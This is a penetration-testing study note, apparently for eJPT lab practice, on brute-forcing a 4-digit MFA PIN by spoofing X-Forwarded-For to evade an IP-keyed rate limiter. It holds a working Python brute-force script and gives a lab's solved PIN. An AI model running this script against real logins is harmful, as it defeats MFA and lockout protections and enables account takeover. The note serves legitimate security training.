---
type: technique
tags: [ejpt:web-pentest]
tools: [burp-suite]
cves: []
related: [[value-brute-force]], [[session-and-cookie-abuse]]
---

# MFA / OTP Brute Force

Brute-forcing a short numeric one-time code (MFA PIN/OTP) and bypassing the rate limiter by spoofing a fresh client IP per attempt.

## When to use

Login demands a fixed-length code (e.g. a 4-digit MFA PIN). The code space is tiny (10,000 for 4 digits), so the only real barrier is throttling/lockout. If the app keys that throttling off a spoofable header, the code becomes brute-forceable.

## The `X-Forwarded-For` bypass

Reverse proxies (and many frameworks) read the *leftmost* `X-Forwarded-For` value as the client IP. If the rate limiter / attempt counter trusts that header without validating the real socket, you can present a **different IP on every request** and never trip the limit — even on a single session.

```python
import requests, random
s = requests.Session()
s.post("http://TARGET/login", data={"dni": "...", "password": "..."})
for code in range(10000):
    guess = str(code).zfill(4)
    spoof = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    r = s.post("http://TARGET/verify-mfa",
               headers={"X-Forwarded-For": spoof},
               data={"pin": guess})
    if len(r.content) != BASELINE:      # size of a known-wrong response
        print("[+]", guess)
        break
```

- Establish the **baseline** (size/status of a known-wrong guess), then flag any deviation — same idea as [[value-brute-force]].
- Keep the **same session** (don't re-login): the point is proving the limiter is IP-keyed, not session-keyed.

## Signals it's vulnerable

- The error page shows a live counter ("Intentos restantes: N") that *resets* when you change `X-Forwarded-For`.
- In Burp Repeater, the same code returns `200` normally but `429`/lockout after N tries — unless you change the header.

## Seen in

[[trailpack]] (4-digit MFA PIN `5271`, `X-Forwarded-For`-keyed limiter)
